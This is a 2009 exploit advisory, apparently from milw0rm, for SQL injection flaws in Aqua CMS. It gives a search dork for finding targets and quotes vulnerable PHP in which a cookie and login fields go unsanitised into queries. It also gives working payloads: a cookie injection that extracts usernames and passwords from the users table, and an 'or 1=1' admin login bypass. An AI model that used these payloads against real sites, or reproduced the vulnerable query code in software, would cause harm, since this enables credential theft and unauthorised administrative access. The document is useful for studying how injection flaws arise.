<html><head><title>Aqua CMS (username) SQL Injection Vulnerability</title></head><pre>================================================================================

Found : halkfild
Dork : &quot;Powered By Aqua Cms&quot;
Vendor: http://www.aquacms.net/
Advisory URL: http://crackfor.me/bugtraq/aquacms.v1.1.txt
Visit : crackfor.me, forum.antichat.ru, raz0r.name
Mail : bugtraq[d0g]crackfor.me
Home : http://crackfor.me - online md5 crack service

================================================================================

  SQL-injections:
  Need: magic quotes = off


 vuln file: /droplets/functions/base.php
 vuln code:

65:// Check the status of the orders

if(isset($_COOKIE[&quot;userSID&quot;])) {
$sqltable = $sitename.&quot;_orders&quot;;
$selck = $_COOKIE[&quot;userSID&quot;];
mysql_select_db($database, $dbconnect);
$query_cartcheck = &quot;SELECT SID FROM $sqltable WHERE SID = '$selck' AND status = 1&quot;;  
$cartcheck = mysql_query($query_cartcheck, $dbconnect) or die(mysql_error());
$row_cartcheck = mysql_fetch_assoc($cartcheck);
$totalRows_cartcheck = mysql_num_rows($cartcheck);

if ($totalRows_cartcheck != 0) {
 $user_ip_address = $_SERVER['REMOTE_ADDR'];
 $dt=date(&quot;YmdHis&quot;); 
 $UID=&quot;$dt$user_ip_address&quot;;
 setcookie(&quot;userSID&quot;, $UID, time()+36000);
}

}


PoC: COOKIE: userSID='[foo]

users passwords: select concat_ws(0x3a3a,username,password)+from+aqua.[prefix_here]_users+--+

-----------------------------------------------------------------------------------


  Auth bypass
  Need: magic quotes = off

 vuln file: /admin/index.php
 vuln code:

10:
if (isset($_POST['username']) == TRUE) {
 $uusername = $_POST['username'];
 $upassword = $_POST['password'];
 $sqltable = $sitename.&quot;_users&quot;;
 mysql_select_db($database, $dbconnect);
 $query_getuser = &quot;
 SELECT * 
 FROM $sqltable 
 WHERE username = '$uusername' 
 AND password = '$upassword' 
 AND groups != '' 
 &quot;;
 $getuser = mysql_query($query_getuser, $dbconnect) or die(&quot;Unable to select database&quot;);
 $row_getuser = mysql_fetch_assoc($getuser);
 $totalRows_getuser = mysql_num_rows($getuser);
 
 if ($totalRows_getuser == 1) {
  $uid = $row_getuser['id'];
  $uun = $row_getuser['username'];
  $ugr = $row_getuser['groups'];
  $setwsuser = $uid.&quot;:&quot;.$uun.&quot;:&quot;.$ugr; 
  //setcookie(&quot;wsuser&quot;, $setwsuser, time()+36000, '/');
  //header(&quot;Location: index.php&quot;);
 } 
 
// User logon: end
}


PoC: POST: username='[foo]
Exploit: POST: username=crackfor.me'+or+1=1+limit+1+--+ 

# milw0rm.com [2009-04-14]</pre></html>